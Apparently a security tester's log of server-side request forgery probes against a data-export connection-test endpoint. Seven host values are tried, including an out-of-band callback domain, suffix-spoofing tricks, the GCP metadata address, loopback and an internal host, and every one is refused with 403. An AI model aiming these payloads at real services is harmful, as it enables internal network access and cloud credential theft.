@@ -1,0 +1,22 @@
+########## snowflake-v2 test-connection host battery ##########
+[S0 valid-format LD host] host=zeno-probe.snowflakecomputing.com -> 403 (1589ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
+[S1 OAST direct] host=d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site -> 403 (3198ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
+[S2 suffix-bypass subdomain] host=zeno-probe.d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site -> 403 (8062ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
+[S3 suffix-spoof] host=zeno-probe.d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site.snowflakecomputing.com -> 403 (32993ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
+[S4 GCP metadata] host=metadata.google.internal -> 403 (1974ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
+[S5 loopback] host=127.0.0.1 -> 403 (1084ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
+[S6 internal LD] host=gonfalon.internal.launchdarkly.com -> 403 (7571ms)
+  {"code":"forbidden","message":"Destination kind snowflake-v2 is unavailable"}
+
